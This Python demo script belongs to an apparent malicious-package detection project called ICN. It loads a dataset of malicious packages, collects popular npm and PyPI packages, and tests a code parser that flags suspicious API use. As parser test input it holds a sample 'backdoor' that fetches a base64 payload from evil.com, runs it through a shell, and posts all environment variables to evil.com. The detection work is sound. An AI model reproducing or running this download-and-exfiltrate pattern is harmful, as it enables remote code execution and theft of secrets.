#!/usr/bin/env python3
"""
ICN Demo Script - Demonstrates the complete data pipeline
Phase 1: Data extraction, categorization, and parsing
"""

from pathlib import Path
from icn.data.malicious_extractor import MaliciousExtractor
from icn.data.benign_collector import BenignCollector
from icn.parsing.unified_parser import UnifiedParser

def main():
    print("🔍 ICN Phase 1 Demo: Data Pipeline")
    print("=" * 50)
    
    # Initialize components
    dataset_path = Path("/Users/guynachshon/Documents/baddon-ai/zorro/malicious-software-packages-dataset")
    malicious_extractor = MaliciousExtractor(str(dataset_path))
    benign_collector = BenignCollector()
    parser = UnifiedParser()
    
    # 1. Analyze malicious dataset
    print("\n1. 📊 Malicious Dataset Analysis")
    print("-" * 30)
    
    manifests = malicious_extractor.load_manifests()
    categories = malicious_extractor.categorize_packages(manifests)
    
    print(f"Total malicious packages found:")
    print(f"  • Malicious intent (plausibility channel): {len(categories['malicious_intent'])}")
    print(f"  • Compromised lib (divergence channel): {len(categories['compromised_lib'])}")
    
    # Show examples
    print(f"\nMalicious intent examples:")
    for sample in categories["malicious_intent"][:3]:
        print(f"  • {sample.ecosystem}/{sample.name}")
    
    if categories["compromised_lib"]:
        print(f"\nCompromised lib examples:")
        for sample in categories["compromised_lib"][:3]:
            print(f"  • {sample.ecosystem}/{sample.name} v{sample.version}")
    
    # 2. Test benign collection
    print(f"\n2. 🌐 Benign Package Collection Test")
    print("-" * 30)
    
    # Test npm popular packages
    npm_popular = benign_collector.npm.get_popular_packages(5)
    print(f"Popular npm packages: {npm_popular}")
    
    # Test PyPI popular packages  
    pypi_popular = benign_collector.pypi.get_popular_packages(5)
    print(f"Popular PyPI packages: {pypi_popular}")
    
    # Get package info for first examples
    if npm_popular:
        npm_sample = benign_collector.npm.get_package_info(npm_popular[0])
        if npm_sample:
            print(f"npm sample: {npm_sample.name} v{npm_sample.version} ({npm_sample.download_count:,} downloads)")
    
    if pypi_popular:
        pypi_sample = benign_collector.pypi.get_package_info(pypi_popular[0])
        if pypi_sample:
            print(f"PyPI sample: {pypi_sample.name} v{pypi_sample.version}")
    
    # 3. Test parsing pipeline
    print(f"\n3. 🔧 Parsing Pipeline Test")
    print("-" * 30)
    
    # Test with sample malicious code
    malicious_code = '''
import subprocess
import requests
import base64
import os

def install_backdoor():
    # Download and execute malicious payload
    payload = requests.get("http://evil.com/payload").text  
    decoded = base64.b64decode(payload)
    subprocess.run(decoded, shell=True)
    
    # Exfiltrate environment variables
    env_data = dict(os.environ)
    requests.post("http://evil.com/exfil", json=env_data)

def legitimate_function():
    print("This looks normal")
    return "hello"
'''
    
    # Test parsing
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(malicious_code)
        temp_path = Path(f.name)
    
    try:
        units = parser._parse_python_file(temp_path, malicious_code, "runtime")
        print(f"Extracted {len(units)} code units:")
        
        for unit in units:
            print(f"\n  📦 {unit.name}:")
            print(f"    • API calls: {unit.api_calls}")
            print(f"    • Intent categories: {', '.join(unit.api_categories) if unit.api_categories else 'none'}")
            print(f"    • Entropy: {unit.entropy:.2f}")
            print(f"    • Obfuscation score: {unit.obfuscation_score:.2f}")
            
            # Highlight suspicious units
            suspicious_categories = {"proc.spawn", "net.outbound", "eval", "encoding"}
            if unit.api_categories & suspicious_categories:
                print(f"    ⚠️  SUSPICIOUS: Contains {unit.api_categories & suspicious_categories}")
                
    finally:
        temp_path.unlink()
    
    # 4. Training data mapping
    print(f"\n4. 🎯 Training Data Mapping (per training.md)")
    print("-" * 30)
    
    print("Data → Loss Function Mapping:")
    print("  • Malicious intent samples → Global Plausibility Loss")
    print("  • Compromised lib samples → Divergence Margin Loss") 
    print("  • Benign samples → Convergence Loss")
    
    print(f"\nRecommended training ratios:")
    malicious_count = len(categories['malicious_intent']) + len(categories['compromised_lib'])
    benign_needed_5_1 = malicious_count * 5
    benign_needed_10_1 = malicious_count * 10
    
    print(f"  • 5:1 ratio → {benign_needed_5_1:,} benign packages needed")
    print(f"  • 10:1 ratio → {benign_needed_10_1:,} benign packages needed")
    
    # 5. Next steps
    print(f"\n5. 🚀 Next Steps (Phase 2)")
    print("-" * 30)
    print("✅ Phase 1 Complete - Data pipeline ready")
    print("📋 Phase 2 Tasks:")
    print("  • Implement Local Intent Estimator (CodeBERT-based)")
    print("  • Build Global Intent Integrator with convergence loop")
    print("  • Create dual detection channels")
    print("  • Implement training losses from training.md")
    
    print(f"\n🎉 ICN Foundation Ready!")
    print("The data extraction, collection, and parsing pipeline is fully functional.")
    print("Ready to move to Phase 2: Core ICN model implementation.")

if __name__ == "__main__":
    main()